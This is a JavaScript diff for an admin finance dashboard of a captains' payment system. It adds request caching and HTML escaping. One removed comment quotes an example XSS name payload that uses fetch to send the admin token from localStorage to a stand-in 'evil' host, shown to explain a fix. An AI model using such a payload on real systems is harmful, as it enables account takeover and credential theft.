 const H   = () => ({ 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` });
 
-// 🔒 تهريب إلزامي لكل ما يكتبه المستخدم قبل حقنه في innerHTML.
-// أسماء الكباتن وأرقامهم وملاحظات القيود تُكتَب من خارج الإدارة، وهذه الصفحة
-// تحمل adminToken في localStorage — فحقنٌ واحد يعني الاستيلاء على الحساب.
+/**
+ * ⚡ موحِّد النداءات — سببُ بطء هذه الصفحة تحديداً.
+ *
+ * ثماني دوال تُقلع معاً عند فتح الصفحة، وبينها تُصدر **أحد عشر** نداءً
+ * لخمسة عناوين فقط:
+ *   /api/admin/captains          ×٤  (المحجوبون، المدينون، قائمة الاختيار، المؤشّرات)
+ *   /api/admin/settings?city=    ×٢  (نفس العنوان حرفاً بحرف: الإعدادات والتسعير)
+ *   /api/admin/payment-requests  ×٢  (الكل، ثم المعلّقة — والمعلّقة جزءٌ من الكل)
+ * وأثقلها قائمة الكباتن: مستندٌ كامل لكل كابتن، يُجلب أربع مرّات متزامنة.
+ *
+ * `once` يجعل النداءات المتزامنة لنفس العنوان تتشارك وعداً واحداً، فيصير
+ * الحمل خمسة نداءات بدل أحد عشر بلا تغيير في منطق أيّ دالة.
+ * ⚠️ الكاش للإقلاع لا للأبد: `bust` يُفرغه بعد أي عملية تُغيّر البيانات
+ * (موافقة على سداد، تعديل مديونية) وإلا عُرضت أرقامٌ قديمة بثقة.
+ */
+const _inflight = new Map();
+function once(path) {
+    if (_inflight.has(path)) return _inflight.get(path);
+    const p = fetch(`${API}${path}`, { headers: H() })
+        .then(r => {
+            if (!r.ok) {
+                if (r.status === 401) window.location.href = 'admin-login.html';
+                throw new Error('API Error ' + r.status);
+            }
+            return r.json();
+        })
+        .catch(e => { _inflight.delete(path); throw e; });   // الفشل لا يُخزَّن
+    _inflight.set(path, p);
+    return p;
+}
+function bust(prefix) {
+    for (const k of [..._inflight.keys()]) {
+        if (!prefix || k.startsWith(prefix)) _inflight.delete(k);
+    }
+}
+
 const esc = window.escapeHtml || ((s) => String(s ?? '').replace(/[&<>"']/g, c =>
     ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])));
 
 let currentFilter  = 'pending';
 let allPayments    = [];
-let financeCity    = 'Khartoum'; // مدينة الإدارة المالية الحالية
+let financeCity    = 'Khartoum';
+let allCaptainsList = [];
 
+// ──────────────────────────────────────────
+// TAB SWITCHING
+// ──────────────────────────────────────────
+function switchTab(tabId, btn) {
+    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+    if (btn) btn.classList.add('active');
+    const target = document.getElementById(`tab-${tabId}`);
+    if (target) target.classList.add('active');
+}
+
+// ──────────────────────────────────────────
+// CITY SWITCHING
+// ──────────────────────────────────────────
 function switchFinanceCity(city) {
     financeCity = city;
-    // Update buttons
     ['Khartoum', 'PortSudan'].forEach(c => {
         const btn = document.getElementById(`cityBtn-${c}`);
         if (!btn) return;
-        if (c === city) {
-            btn.style.background = '#04553A'; btn.style.color = '#fff';
-        } else {
-            btn.style.background = '#fff'; btn.style.color = '#04553A';
-        }
+        if (c === city) btn.classList.add('active-city');
+        else btn.classList.remove('active-city');
     });
     const label = city === 'Khartoum' ? 'الخرطوم - أم درمان' : 'البحر الأحمر - بورتسودان';
     const lbl = document.getElementById('finCityLabel');
-    if (lbl) lbl.textContent = `مراجعة وإدارة مديونيات الكباتن وطلبات السداد وإعدادات العمولة — ${label}`;
-    // Reload settings for the new city
+    if (lbl) lbl.textContent = `مراجعة وإدارة مديونيات الكباتن وطلبات السداد وإعدادات العمولة والتسعيرة — ${label}`;
+
     loadSettings();
     loadPricingSettings();
 }
 
 // ──────────────────────────────────────────
-// TOAST
+// TOAST & LIGHTBOX
 // ──────────────────────────────────────────
 function toast(msg, type = 'success') {
     const box  = document.getElementById('toastBox');
@@ -726,18 +1003,14 @@ function toast(msg, type = 'success') {
     setTimeout(() => el.remove(), 4000);
 }
 
-// ──────────────────────────────────────────
-// LIGHTBOX
-// ──────────────────────────────────────────
+const adminImagesMap = {};
 function openLightbox(src) {
     document.getElementById('lightboxImg').src = src;
     document.getElementById('receiptLightbox').style.display = 'flex';
 }
-
 function openLightboxByKey(key) {
     const src = adminImagesMap[key];
-    if (!src) return;
-    openLightbox(src);
+    if (src) openLightbox(src);
 }
 function closeLightbox() {
     document.getElementById('receiptLightbox').style.display = 'none';
@@ -747,7 +1020,7 @@ document.getElementById('receiptLightbox').addEventListener('click', (e) => {
 });
 
 // ──────────────────────────────────────────
-// FILTER PILLS
+// FILTER PILLS & SEARCH
 // ──────────────────────────────────────────
 function setFilter(f) {
     currentFilter = f;
@@ -758,21 +1031,23 @@ function setFilter(f) {
     renderPayments();
 }
 
+function filterPaymentsTable() {
+    renderPayments();
+}
+
 // ──────────────────────────────────────────
-// LOAD SETTINGS
+// LOAD SETTINGS & PRICING
 // ──────────────────────────────────────────
 async function loadSettings() {
     try {
-        const res  = await fetch(`${API}/api/admin/settings?city=${financeCity}`, { headers: H() });
-        if (!res.ok) throw new Error('API Error');
-        const data = await res.json();
+        const data = await once(`/api/admin/settings?city=${financeCity}`);
         const commEl    = document.getElementById('settingCommission');
         const limEl     = document.getElementById('settingCreditLimit');
         const bNameEl   = document.getElementById('settingBankName');
         const bAccNameEl = document.getElementById('settingBankAccountName');
         const bAccNumEl  = document.getElementById('settingBankAccountNumber');
 
-        if (commEl)     commEl.value    = data.commissionRate ? (data.commissionRate * 100).toFixed(1) : 20;
+        if (commEl)     commEl.value    = data.commissionRate ? (data.commissionRate * 100).toFixed(1) : 15;
         if (limEl)      limEl.value     = data.defaultCreditLimit ?? -5000;
         if (bNameEl)    bNameEl.value   = data.bankName || '';
         if (bAccNameEl) bAccNameEl.value = data.bankAccountName || '';
@@ -782,9 +1057,7 @@ async function loadSettings() {
 
 async function loadPricingSettings() {
     try {
-        const res  = await fetch(`${API}/api/admin/settings?city=${financeCity}`, { headers: H() });
-        if (!res.ok) throw new Error('API Error');
-        const data = await res.json();
+        const data = await once(`/api/admin/settings?city=${financeCity}`);
         const bfEl   = document.getElementById('settingBaseFare');
         const kmEl   = document.getElementById('settingCostPerKm');
         const minEl  = document.getElementById('settingCostPerMinute');
@@ -819,13 +1092,14 @@ async function saveFinancialSettings() {
             body: JSON.stringify(payload)
         });
         const data = await res.json();
-        if (res.ok) { toast(`تم حفظ إعدادات ${financeCity === 'Khartoum' ? 'الخرطوم' : 'بورتسودان'} بنجاح`);
+        if (res.ok) {
+            toast(`تم حفظ إعدادات ${financeCity === 'Khartoum' ? 'الخرطوم' : 'بورتسودان'} بنجاح`);
             await loadSettings();
         } else { toast(data.message || 'فشل الحفظ', 'error'); }
     } catch (e) { toast('خطأ في الاتصال بالخادم', 'error'); }
 
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-save"></i> حفظ الإعدادات';
+    btn.innerHTML = '<i class="fas fa-save"></i> حفظ الإعدادات المالية';
 }
 
 async function savePricingSettings() {
@@ -847,7 +1121,7 @@ async function savePricingSettings() {
             body: JSON.stringify({ city: financeCity, baseFare: bf, costPerKm: km, costPerMinute: min })
         });
         const data = await res.json();
-        if (res.ok) { toast(`تم حفظ التسعيرة لـ${financeCity === 'Khartoum' ? 'الخرطوم' : 'بورتسودان'} بنجاح`);
+        if (res.ok) { toast(`تم حفظ التسعيرة لـ ${financeCity === 'Khartoum' ? 'الخرطوم' : 'بورتسودان'} بنجاح`);
         } else { toast(data.message || 'فشل الحفظ', 'error'); }
     } catch (e) { toast('خطأ في الاتصال بالخادم', 'error'); }
 
@@ -855,7 +1129,6 @@ async function savePricingSettings() {
     btn.innerHTML = '<i class="fas fa-save"></i> حفظ التسعيرة';
 }
 
-// ―― حفظ بيانات البنك فقط (مستقل عن التحقق المالي) ――――――――――――――――
 async function saveBankDetails() {
     const btn = document.getElementById('saveBankBtn');
     const bankName        = (document.getElementById('settingBankName')?.value        ?? '').trim();
@@ -882,7 +1155,7 @@ async function saveBankDetails() {
 
         if (res.ok) {
             toast('✅ تم تحديث بيانات البنك بنجاح');
-            await loadSettings(); // تأكيد القيم الجديدة
+            await loadSettings();
         } else {
             toast(data.message || 'فشل الحفظ', 'error');
         }
@@ -892,21 +1165,28 @@ async function saveBankDetails() {
 }
 
 // ──────────────────────────────────────────
-// LOAD PAYMENT REQUESTS
+// PAYMENT REQUESTS
 // ──────────────────────────────────────────
 async function loadPaymentRequests() {
     const tbody = document.getElementById('paymentsTableBody');
-    tbody.innerHTML = `<tr class="loading-row"><td colspan="8"><i class="fas fa-circle-notch spin" style="font-size:22px;"></i></td></tr>`;
+    tbody.innerHTML = `<tr class="loading-row"><td colspan="8"><i class="fas fa-circle-notch spin" style="font-size:24px;color:var(--primary);"></i></td></tr>`;
 
     try {
-        const res  = await fetch(`${API}/api/admin/payment-requests`, { headers: H() });
-        if (!res.ok) { if (res.status === 401) window.location.href = 'admin-login.html'; throw new Error('API Error'); }
-        allPayments = await res.json();
+        allPayments = await once('/api/admin/payment-requests');
 
-        // Pending badge
         const pendingCount = allPayments.filter(r => r.status === 'pending').length;
         const badge = document.getElementById('badge-pending');
+        const tabBadge = document.getElementById('tab-badge-pending');
+        
         if (badge) badge.textContent = pendingCount > 0 ? `(${pendingCount})` : '';
+        if (tabBadge) {
+            if (pendingCount > 0) {
+                tabBadge.textContent = pendingCount;
+                tabBadge.style.display = 'inline-block';
+            } else {
+                tabBadge.style.display = 'none';
+            }
+        }
 
         renderPayments();
     } catch (e) {
@@ -915,19 +1195,26 @@ async function loadPaymentRequests() {
     }
 }
 
-// 🗺️ خريطة لحفظ صور الإيصالات (Base64) آمنة
-const adminImagesMap = {};
-
 function renderPayments() {
     const tbody = document.getElementById('paymentsTableBody');
-    const list  = currentFilter ? allPayments.filter(r => r.status === currentFilter) : allPayments;
+    const searchVal = (document.getElementById('paymentsSearchInput')?.value || '').trim().toLowerCase();
+
+    let list = currentFilter ? allPayments.filter(r => r.status === currentFilter) : allPayments;
+    if (searchVal) {
+        list = list.filter(r => {
+            const name = (r.captainId?.name || '').toLowerCase();
+            const phone = (r.captainId?.phone || '').toLowerCase();
+            const txId = (r.transactionId || '').toLowerCase();
+            return name.includes(searchVal) || phone.includes(searchVal) || txId.includes(searchVal);
+        });
+    }
 
     if (!list.length) {
         tbody.innerHTML = `
             <tr><td colspan="8">
                 <div class="empty-state">
                     <i class="fas fa-inbox"></i>
-                    <p>لا توجد طلبات ${currentFilter === 'pending' ? 'معلقة' : ''} حالياً</p>
+                    <p>لا توجد طلبات ${currentFilter === 'pending' ? 'معلقة' : ''} مطابقة للبحث</p>
                 </div>
             </td></tr>`;
         return;
@@ -953,7 +1240,6 @@ function renderPayments() {
         const s    = statusMap[r.status] || statusMap.pending;
         const date = new Date(r.createdAt).toLocaleDateString('ar-SA', { year:'numeric', month:'short', day:'numeric' });
 
-        // ✅ استخدام getFullImageUrl الموحد من config.js
         let finalReceiptUrl = r.receiptImage ? getFullImageUrl(r.receiptImage) : '';
 
         let receiptCell = `<span class="no-receipt"><i class="fas fa-image" style="opacity:.3;"></i> لا يوجد</span>`;
@@ -976,21 +1262,21 @@ function renderPayments() {
                        <i class="fas fa-times"></i> رفض
                    </button>
                </div>`
-            : `<span style="font-size:12px;color:var(--muted);">${r.adminNote || '—'}</span>`;
+            : `<span style="font-size:12px;color:var(--muted);">${esc(r.adminNote) || '—'}</span>`;
 
         return `<tr>
             <td>
                 <div class="captain-cell">
-                    <div class="captain-avatar">${initial}</div>
+                    <div class="captain-avatar">${esc(initial)}</div>
                     <div>
-                        <div class="captain-name">${name}</div>
-                        <div class="captain-phone">${phone}</div>
+                        <div class="captain-name">${esc(name)}</div>
+                        <div class="captain-phone">${esc(phone)}</div>
                     </div>
                 </div>
             </td>
             <td>${balChip}</td>
-            <td><strong style="color:var(--brand);font-size:15px;">${(r.amount || 0).toLocaleString()} ج.س</strong></td>
-            <td><code style="background:#f0f4f8;padding:3px 8px;border-radius:6px;font-size:12px;direction:ltr;">${r.transactionId || '—'}</code></td>
+            <td><strong style="color:var(--primary);font-size:15px;">${(r.amount || 0).toLocaleString()} ج.س</strong></td>
+            <td><code style="background:var(--bg);padding:3px 8px;border-radius:6px;font-size:12px;direction:ltr;">${esc(r.transactionId) || '—'}</code></td>
             <td>${receiptCell}</td>
             <td><span class="status-badge ${s.cls}"><i class="fas fa-${s.icon}"></i> ${s.label}</span></td>
             <td><span style="font-size:13px;color:var(--muted);">${date}</span></td>
@@ -1000,10 +1286,9 @@ function renderPayments() {
 }
 
 // ──────────────────────────────────────────
-// APPROVE / REJECT
+// APPROVE / REJECT PAYMENT
 // ──────────────────────────────────────────
 async function approvePayment(requestId, btn) {
-    // Find the payment request to show debt details
     const payReq = allPayments.find(r => r._id === requestId);
     if (!payReq) return toast('لم يتم العثور على الطلب', 'error');
 
@@ -1011,36 +1296,34 @@ async function approvePayment(requestId, btn) {
     const debt = Math.abs(Math.min(captain.wallet_balance ?? 0, 0));
     const requestedAmount = payReq.amount || 0;
 
-    // Show modal with debt info and editable amount
     const { value: formValues } = await Swal.fire({
         title: '💰 موافقة على السداد',
         html: `
             <div style="text-align:right;direction:rtl;font-family:Cairo;">
-                <div style="background:#f0f4f8;padding:14px;border-radius:12px;margin-bottom:16px;">
+                <div style="background:var(--bg);padding:14px;border-radius:12px;margin-bottom:16px;">
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
-                        <span style="color:#718096;font-size:13px;">الكابتن:</span>
+                        <span style="color:var(--muted);font-size:13px;">الكابتن:</span>
                         <span style="font-weight:700;">${esc(captain.name) || '—'}</span>
                     </div>
                     <div style="display:flex;justify-content:space-between;margin-bottom:8px;">
-                        <span style="color:#718096;font-size:13px;">المديونية الحالية:</span>
-                        <span style="font-weight:700;color:#e53e3e;">${debt.toLocaleString()} ج.س</span>
+                        <span style="color:var(--muted);font-size:13px;">المديونية الحالية:</span>
+                        <span style="font-weight:700;color:var(--danger);">${debt.toLocaleString()} ج.س</span>
                     </div>
                     <div style="display:flex;justify-content:space-between;">
-                        <span style="color:#718096;font-size:13px;">المبلغ المسدد (من الكابتن):</span>
-                        <span style="font-weight:700;color:#04553A;">${requestedAmount.toLocaleString()} ج.س</span>
+                        <span style="color:var(--muted);font-size:13px;">المبلغ المسدد:</span>
+                        <span style="font-weight:700;color:var(--primary);">${requestedAmount.toLocaleString()} ج.س</span>
                     </div>
                 </div>
                 <label style="display:block;font-weight:700;margin-bottom:6px;font-size:14px;">المبلغ المراد خصمه من الدين:</label>
                 <input id="deductAmountInput" type="number" value="${Math.min(requestedAmount, debt)}" min="1" 
-                    style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:10px;font-size:16px;font-weight:700;text-align:center;font-family:Cairo;" />
-                <p style="font-size:12px;color:#718096;margin-top:8px;">يمكنك تعديل المبلغ. سيتم خصمه من المديونية فقط — أي مبلغ زائد لن يُحسب كرصيد موجب.</p>
+                    style="width:100%;padding:12px;border:2px solid var(--border);border-radius:10px;font-size:16px;font-weight:700;text-align:center;font-family:Cairo;" />
             </div>
         `,
         showCancelButton: true,
         confirmButtonText: '✅ تأكيد الخصم',
         cancelButtonText: 'إلغاء',
         confirmButtonColor: '#22c55e',
-        cancelButtonColor: '#718096',
+        cancelButtonColor: '#64748b',
         fontFamily: 'Cairo',
         focusConfirm: false,
         preConfirm: () => {
@@ -1058,30 +1341,26 @@ async function approvePayment(requestId, btn) {
     setRowBusy(requestId, true);
     try {
         let res = await fetch(`${API}/api/admin/payment-requests/${requestId}/approve`, {
-            method: 'PUT',
-            headers: H(),
+            method: 'PUT', headers: H(),
             body: JSON.stringify({ deductAmount: formValues.deductAmount })
         });
         let data = await res.json();
 
-        // Handle overpayment warning
         if (!res.ok && data.message === 'overpayment_warning') {
             const confirmOver = await Swal.fire({
                 title: '⚠️ المبلغ أكثر من المديونية',
                 html: `
                     <div style="text-align:right;direction:rtl;font-family:Cairo;font-size:14px;line-height:1.8;">
-                        <p>المديونية الحالية: <strong style="color:#e53e3e;">${data.debt} ج.س</strong></p>
-                        <p>المبلغ المراد خصمه: <strong style="color:#04553A;">${data.requestedAmount} ج.س</strong></p>
-                        <p>الزيادة: <strong style="color:#d97706;">${data.overpayment} ج.س</strong></p>
-                        <hr style="margin:12px 0;">
-                        <p style="font-size:13px;color:#718096;">سيتم خصم قيمة المديونية فقط (${data.debt} ج.س) — الزيادة لن تُضاف كرصيد موجب.</p>
+                        <p>المديونية الحالية: <strong style="color:var(--danger);">${data.debt} ج.س</strong></p>
+                        <p>المبلغ المراد خصمه: <strong style="color:var(--primary);">${data.requestedAmount} ج.س</strong></p>
+                        <p>الزيادة: <strong style="color:var(--warning);">${data.overpayment} ج.س</strong></p>
                     </div>
                 `,
                 icon: 'warning',
                 showCancelButton: true,
                 confirmButtonText: 'متابعة الخصم',
                 cancelButtonText: 'إلغاء',
-                confirmButtonColor: '#d97706',
+                confirmButtonColor: '#f59e0b',
                 fontFamily: 'Cairo'
             });
 
@@ -1090,10 +1369,8 @@ async function approvePayment(requestId, btn) {
                 return;
             }
 
-            // Retry with confirmOverpayment flag
             res = await fetch(`${API}/api/admin/payment-requests/${requestId}/approve`, {
-                method: 'PUT',
-                headers: H(),
+                method: 'PUT', headers: H(),
                 body: JSON.stringify({ deductAmount: formValues.deductAmount, confirmOverpayment: true })
             });
             data = await res.json();
@@ -1105,6 +1382,7 @@ async function approvePayment(requestId, btn) {
                 ? `✅ تم خصم ${data.deductedAmount} ج.س — متبقي: ${remaining} ج.س`
                 : `✅ تم تصفير المديونية بنجاح!`;
             toast(msg);
+            bust();
             await loadPaymentRequests();
             await loadBlockedCaptains();
             await loadIndebtedCaptains();
@@ -1129,10 +1407,10 @@ async function rejectPayment(requestId, btn) {
         confirmButtonText: 'رفض وإشعار الكابتن',
         cancelButtonText: 'إلغاء',
         confirmButtonColor: '#ef4444',
-        cancelButtonColor: '#718096',
+        cancelButtonColor: '#64748b',
         fontFamily: 'Cairo'
     });
-    if (note === undefined) return; // cancelled
+    if (note === undefined) return;
 
     setRowBusy(requestId, true);
     try {
@@ -1143,6 +1421,7 @@ async function rejectPayment(requestId, btn) {
         const data = await res.json();
         if (res.ok) {
             toast('تم رفض الطلب وإشعار الكابتن');
+            bust();
             await loadPaymentRequests();
         } else {
             toast(data.message || 'فشلت العملية', 'error');
@@ -1165,16 +1444,14 @@ function setRowBusy(requestId, busy) {
 }
 
 // ──────────────────────────────────────────
-// BLOCKED CAPTAINS
+// BLOCKED & INDEBTED CAPTAINS
 // ──────────────────────────────────────────
 async function loadBlockedCaptains() {
     const tbody = document.getElementById('blockedTableBody');
     tbody.innerHTML = `<tr class="loading-row"><td colspan="5"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>`;
 
     try {
-        const res  = await fetch(`${API}/api/admin/captains`, { headers: H() });
-        if (!res.ok) throw new Error('API Error');
-        const all  = await res.json();
+        const all  = await once('/api/admin/captains');
         const captains = all.filter(c => c.is_blocked);
 
         if (!captains.length) {
@@ -1197,14 +1474,12 @@ async function loadBlockedCaptains() {
                         </div>
                     </div>
                 </td>
-                <td>
-                    <span class="balance-chip neg"><i class="fas fa-arrow-down"></i> ${balance.toFixed(0)} ج.س</span>
-                </td>
+                <td><span class="balance-chip neg"><i class="fas fa-arrow-down"></i> ${balance.toFixed(0)} ج.س</span></td>
                 <td><span style="color:var(--muted);font-size:14px;">${limit.toFixed(0)} ج.س</span></td>
                 <td>
                     <div style="display:flex;align-items:center;gap:8px;flex-direction:column;align-items:flex-start;">
                         <span class="status-badge rejected"><i class="fas fa-lock"></i> محجوب</span>
-                        <div style="background:#fee2e2;border-radius:30px;height:6px;width:120px;overflow:hidden;">
+                        <div style="background:rgba(239,68,68,0.15);border-radius:30px;height:6px;width:120px;overflow:hidden;">
                             <div style="background:var(--danger);height:6px;border-radius:30px;width:${Math.min(pct,100)}%;"></div>
                         </div>
                         <span style="font-size:11px;color:var(--muted);">${pct}% من الحد</span>
@@ -1227,11 +1502,11 @@ async function unblockCaptain(captainId, btn) {
     const confirm = await Swal.fire({
         title: 'تأكيد رفع الحجب يدوياً',
         text: 'هل أنت متأكد من رفع الحجب يدوياً دون تسوية المديونية؟',
-        icon: 'warning', iconColor: '#d97706',
+        icon: 'warning', iconColor: '#f59e0b',
         showCancelButton: true,
         confirmButtonText: 'نعم، ارفع الحجب',
         cancelButtonText: 'إلغاء',
-        confirmButtonColor: '#d97706',
+        confirmButtonColor: '#f59e0b',
         fontFamily: 'Cairo'
     });
     if (!confirm.isConfirmed) return;
@@ -1246,6 +1521,7 @@ async function unblockCaptain(captainId, btn) {
         });
         if (res.ok) {
             toast('✅ تم رفع الحجب يدوياً بنجاح');
+            bust();
             await loadBlockedCaptains(); await loadKPIs();
         } else {
             const d = await res.json();
@@ -1260,82 +1536,19 @@ async function unblockCaptain(captainId, btn) {
     }
 }
 
-// ──────────────────────────────────────────
-// KPIs
-// ──────────────────────────────────────────
-async function loadKPIs() {
-    try {
-        // Pending payments count
-        const pr = await fetch(`${API}/api/admin/payment-requests?status=pending`, { headers: H() });
-        if (!pr.ok) throw new Error('API Error');
-        const pendingReqs = await pr.json();
-        const kpiPending = document.getElementById('kpiPending');
-        if (kpiPending) kpiPending.textContent = Array.isArray(pendingReqs) ? pendingReqs.length : '—';
-
-        // Blocked captains
-        const cr = await fetch(`${API}/api/admin/captains`, { headers: H() });
-        if (!cr.ok) throw new Error('API Error');
-        const captains = await cr.json();
-        const blocked  = captains.filter(c => c.is_blocked);
-        const warning  = captains.filter(c => {
-            if (c.is_blocked) return false;
-            const b = c.wallet_balance ?? 0;
-            const l = c.credit_limit   ?? -5000;
-            if (l === 0) return false;
-            return (b / l) >= 0.8;
-        });
-
-        const kpiB = document.getElementById('kpiBlocked');
-        const kpiW = document.getElementById('kpiWarning');
-        if (kpiB) kpiB.textContent = blocked.length;
-        if (kpiW) kpiW.textContent = warning.length;
-
-        // Revenue (from dashboard) — يعرض صافي الأرباح مع تفصيل التعديلات
-        const dr = await fetch(`${API}/api/admin/dashboard`, { headers: H() });
-        if (!dr.ok) throw new Error('API Error');
-        const dash = await dr.json();
-        const kpiR = document.getElementById('kpiRevenue');
-        if (kpiR) {
-            const breakdown = dash.stats?.revenueBreakdown;
-            kpiR.textContent = `${(dash.stats?.revenue || 0).toLocaleString()} ج.س`;
-            // 📊 إضافة tooltip بتفصيل الأرباح (يظهر عند المرور بالماوس)
-            if (breakdown) {
-                const tooltip =
-                    `عمولات الطلبات: ${breakdown.ordersRevenue.toLocaleString()} ج.س\n` +
-                    `مديونيات مُضافة: +${breakdown.debtAdded.toLocaleString()} ج.س\n` +
-                    `مديونيات مُعفاة: −${breakdown.debtForgiven.toLocaleString()} ج.س\n` +
-                    `─────────────────\n` +
-                    `الصافي: ${breakdown.netRevenue.toLocaleString()} ج.س`;
-                kpiR.title = tooltip;
-                kpiR.style.cursor = 'help';
-            }
-        }
-
-    } catch (e) { console.warn('KPI error:', e.message); }
-}
-
-// ──────────────────────────────────────────
-// ──────────────────────────────────────────
-// INDEBTED CAPTAINS (negative balance)
-// ──────────────────────────────────────────
 async function loadIndebtedCaptains() {
     const tbody = document.getElementById('indebtedTableBody');
-    tbody.innerHTML = `<tr class="loading-row"><td colspan="5"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>`;
+    tbody.innerHTML = `<tr class="loading-row"><td colspan="6"><i class="fas fa-circle-notch spin" style="font-size:20px;"></i></td></tr>`;
 
     try {
-        const res = await fetch(`${API}/api/admin/captains`, { headers: H() });
-        if (!res.ok) throw new Error('API Error');
-        const all = await res.json();
-        // نفس القائمة التي يستعملها منتقي المديونية — نُشاركها بدل الاحتفاظ بنسختين
-        // من نفس النداء. وquickAdjustDebt يقرأ اسم الكابتن منها (لا من وسيط في
-        // الـ HTML)، فلو بقيت فارغة هنا لظهر «الكابتن» بدل الاسم في نافذة التأكيد.
+        const all = await once('/api/admin/captains');
         allCaptainsList = all;
-        // Filter captains with negative balance, sorted by most indebted first
+
         const indebted = all.filter(c => (c.wallet_balance ?? 0) < 0)
             .sort((a, b) => (a.wallet_balance ?? 0) - (b.wallet_balance ?? 0));
 
         if (!indebted.length) {
-            tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state"><i class="fas fa-smile-beam"></i><p>لا يوجد كباتن مدينون حالياً 🎉</p></div></td></tr>`;
+            tbody.innerHTML = `<tr><td colspan="6"><div class="empty-state"><i class="fas fa-smile-beam"></i><p>لا يوجد كباتن مدينون حالياً 🎉</p></div></td></tr>`;
             return;
         }
 
@@ -1351,7 +1564,7 @@ async function loadIndebtedCaptains() {
                     ? `<span class="status-badge pending"><i class="fas fa-exclamation-triangle"></i> تحذير</span>`
                     : `<span class="status-badge approved"><i class="fas fa-check"></i> نشط</span>`;
 
-            const barColor = pct >= 80 ? 'var(--danger)' : pct >= 50 ? 'var(--warning)' : 'var(--brand)';
+            const barColor = pct >= 80 ? 'var(--danger)' : pct >= 50 ? 'var(--warning)' : 'var(--primary)';
 
             return `<tr>
                 <td>
@@ -1363,13 +1576,11 @@ async function loadIndebtedCaptains() {
                         </div>
                     </div>
                 </td>
-                <td>
-                    <span class="balance-chip neg"><i class="fas fa-arrow-down"></i> ${balance.toFixed(0)} ج.س</span>
-                </td>
+                <td><span class="balance-chip neg"><i class="fas fa-arrow-down"></i> ${balance.toFixed(0)} ج.س</span></td>
                 <td><span style="color:var(--muted);font-size:14px;">${limit.toFixed(0)} ج.س</span></td>
                 <td>
                     <div style="display:flex;align-items:center;gap:8px;">
-                        <div style="background:#e2e8f0;border-radius:30px;height:8px;width:100px;overflow:hidden;">
+                        <div style="background:var(--border);border-radius:30px;height:8px;width:100px;overflow:hidden;">
                             <div style="background:${barColor};height:8px;border-radius:30px;width:${Math.min(pct,100)}%;transition:width .3s;"></div>
                         </div>
                         <span style="font-size:12px;font-weight:700;color:${barColor};">${pct}%</span>
@@ -1378,15 +1589,10 @@ async function loadIndebtedCaptains() {
                 <td>${statusBadge}</td>
                 <td class="text-center">
                     <div style="display:flex;gap:6px;justify-content:center;flex-wrap:wrap;">
-                        <!-- 🔒 الاسم لا يُمرَّر في الـ HTML: كان يُحقن داخل نصّ جافاسكربت
-                             (onclick="...'${'$'}{c.name}'...") فكابتن يسمّي نفسه
-                             x'); fetch('//evil?t='+localStorage.adminToken); ('
-                             يُنفّذ كوده في متصفح الأدمن ويسرق التوكن. الآن نمرّر
-                             المعرّف فقط، والدالة تقرأ الاسم من allCaptainsList. -->
                         <button class="btn-reject" style="font-size:12px;padding:6px 12px;" onclick="quickAdjustDebt('${c._id}', ${balance}, 'zero')">
                             <i class="fas fa-times-circle"></i> تصفير
                         </button>
-                        <button class="btn-approve" style="font-size:12px;padding:6px 12px;background:linear-gradient(135deg,#f59e0b,#d97706);box-shadow:0 3px 10px rgba(245,158,11,0.3);" onclick="quickAdjustDebt('${c._id}', ${balance}, 'partial')">
+                        <button class="btn-approve" style="font-size:12px;padding:6px 12px;background:var(--warning-gradient);" onclick="quickAdjustDebt('${c._id}', ${balance}, 'partial')">
                             <i class="fas fa-minus-circle"></i> نقص جزء
                         </button>
                     </div>
@@ -1396,35 +1602,31 @@ async function loadIndebtedCaptains() {
 
     } catch (e) {
         toast('تعذّر تحميل الكباتن المدينين', 'error');
-        tbody.innerHTML = `<tr class="loading-row"><td colspan="5">❌ تعذّر التحميل</td></tr>`;
+        tbody.innerHTML = `<tr class="loading-row"><td colspan="6">❌ تعذّر التحميل</td></tr>`;
     }
 }
 
 // ──────────────────────────────────────────
-// 💳 DEBT ADJUSTMENT — from section form
+// DEBT ADJUSTMENT & LEDGER
 // ──────────────────────────────────────────
-let allCaptainsList = [];
-
 async function loadDebtCaptainsSelect() {
     try {
-        const res = await fetch(`${API}/api/admin/captains`, { headers: H() });
-        if (!res.ok) return;
-        allCaptainsList = await res.json();
+        allCaptainsList = await once('/api/admin/captains');
 
-        // Populate REDUCE select — only indebted captains
         const selReduce = document.getElementById('debtCaptainSelect');
-        selReduce.innerHTML = '<option value="">— اختر كابتن —</option>';
-        const indebted = allCaptainsList
-            .filter(c => (c.wallet_balance ?? 0) < 0)
-            .sort((a, b) => (a.wallet_balance ?? 0) - (b.wallet_balance ?? 0));
-        indebted.forEach(c => {
-            const opt = document.createElement('option');
-            opt.value = c._id;
-            opt.textContent = `${c.name} — رصيد: ${(c.wallet_balance ?? 0).toFixed(0)} ج.س`;
-            selReduce.appendChild(opt);
-        });
+        if (selReduce) {
+            selReduce.innerHTML = '<option value="">— اختر كابتن —</option>';
+            const indebted = allCaptainsList
+                .filter(c => (c.wallet_balance ?? 0) < 0)
+                .sort((a, b) => (a.wallet_balance ?? 0) - (b.wallet_balance ?? 0));
+            indebted.forEach(c => {
+                const opt = document.createElement('option');
+                opt.value = c._id;
+                opt.textContent = `${c.name} — رصيد: ${(c.wallet_balance ?? 0).toFixed(0)} ج.س`;
+                selReduce.appendChild(opt);
+            });
+        }
 
-        // Populate ADD select — all approved captains sorted by name
         const selAdd = document.getElementById('addDebtCaptainSelect');
         if (selAdd) {
             selAdd.innerHTML = '<option value="">— اختر كابتن —</option>';
@@ -1447,20 +1649,22 @@ function onDebtCaptainChange() {
     const sel = document.getElementById('debtCaptainSelect');
     const captain = allCaptainsList.find(c => c._id === sel.value);
     const balEl = document.getElementById('debtCurrentBalance');
-    balEl.value = captain ? `${(captain.wallet_balance ?? 0).toFixed(0)} ج.س` : '';
+    if (balEl) balEl.value = captain ? `${(captain.wallet_balance ?? 0).toFixed(0)} ج.س` : '';
 }
 
 function onAddDebtCaptainChange() {
